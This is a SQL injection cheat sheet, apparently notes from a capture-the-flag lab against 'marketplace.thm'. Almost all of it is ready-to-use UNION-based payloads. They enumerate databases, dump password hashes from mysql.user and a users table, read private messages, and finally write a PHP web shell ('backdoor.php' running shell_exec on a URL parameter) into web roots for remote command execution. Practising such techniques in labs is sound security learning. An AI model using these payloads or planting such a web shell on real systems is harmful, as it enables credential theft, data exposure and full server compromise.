Basic SQLI check in url paramater:
<http://marketplace.thm/admin?user=3> or 1=1;--
<http://marketplace.thm/admin?user=3'>

Determining Columns: 
<http://marketplace.thm/admin?user=-3> UNION SELECT NULL, NULL, NULL, NULL;--

'UNION SELECT NULL--
'UNION SELECT NULL, NULL--
'UNION SELECT NULL, NULL, NULL--
'UNION SELECT NULL, NULL, NULL, NULL--

Figuring out data type and what can be displayed back to us:
'UNION SELECT 'a', NULL, NULL, NULL--
'UNION SELECT NULL, 'a', NULL, NULL--
'UNION SELECT NULL, NULL, 'a', NULL--
‘UNION SELECT NULL, NULL, NULL 'a'--

Retrieving basic information:
http://marketplace.thm/admin?user=-3 UNION SELECT @@version, NULL, NULL, NULL;--
http://marketplace.thm/admin?user=-3 UNION SELECT @@hostname, NULL, NULL, NULL;--
http://marketplace.thm/admin?user=-3 UNION SELECT database(), NULL, NULL, NULL;--
http://marketplace.thm/admin?user=-3 UNION SELECT user(), NULL, NULL, NULL;--
http://marketplace.thm/admin?user=-3 UNION SELECT system_user(), NULL, NULL, NULL;--
http://marketplace.thm/admin?user=-3 UNION SELECT host, user, password, NULL from mysql.user;--   (might not have privs)

See all tablenames from all databases: (Usually start looking at bottom with this technique) (Use json_arrayagg over group_concat usually as it has much larget text limit)
http://marketplace.thm/admin?user=-3 UNION SELECT json_arrayagg(concat_ws(0x3a, table_name, table_schema)), null,null,null from INFORMATION_SCHEMA.tables;--
	
See tablenames from a selected database:
http://marketplace.thm/admin?user=-3 UNION SELECT json_arrayagg(concat_ws(0x3a, table_name, table_schema)), null,null,null from INFORMATION_SCHEMA.tables where table_schema='marketplace';--

See columns and tablenames from selected database:
http://marketplace.thm/admin?user=-3 UNION SELECT json_arrayagg(concat_ws(0x3a, table_name, column_name)), null,null,null from INFORMATION_SCHEMA.columns where table_schema='marketplace';--

If you're insane and wanna see all columns from all tables from all databases:
http://marketplace.thm/admin?user=-3 UNION SELECT json_arrayagg(concat_ws(0x3a, table_name, column_name, table_schema)), null,null,null from INFORMATION_SCHEMA.columns;--

List rows from the users table from the marketplace database:
http://marketplace.thm/admin?user=-3 UNION SELECT json_arrayagg(concat_ws(0x3a, password)), null,null,null from marketplace.users;--

List many rows from the messages table from the marketplace database: (PRO TIP: use gedit here to cut text so less writing is required)
<http://marketplace.thm/admin?user=-3> UNION SELECT json_arrayagg(concat_ws(0x3a, id, is_read, message_content, user_from, user_to)), null,null,null from marketplace.messages;--

SQLI to RCE:
UNION SELECT NULL, NULL, NULL,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
UNION SELECT NULL, NULL, NULL,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE '/var/www/backdoor.php'
UNION SELECT NULL, NULL, NULL,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE '/var/www/html/backdoor.php'
<http://10.10.123.31/backdoor.php?cmd=whoami>

http://marketplace.thm/admin?user=-3 UNION SELECT NULL, "<?php echo shell_exec($_GET['cmd']);?>", NULL, NULL into OUTFILE 'c:/inetpub/wwwroot/backdoor.php';--

(Needs certain permissions in place so testing is needed)